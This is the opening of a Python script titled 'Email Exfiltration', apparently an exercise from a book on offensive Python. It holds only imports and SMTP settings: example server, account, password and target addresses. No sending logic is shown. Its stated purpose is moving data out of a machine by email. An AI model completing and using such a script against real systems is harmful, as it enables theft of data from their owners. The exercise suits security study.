#!/usr/bin/env python
'''
Email Exfiltration
BHP: Page 142
'''

import smtplib
import time
import win32com.client

smtp_server   = 'smtp.example.com'
smtp_port     = 587
smtp_act      = 'tim@example.com'
smtp_password = 'seKret'
tgt_acts      = ['tim@elsewhere.com']

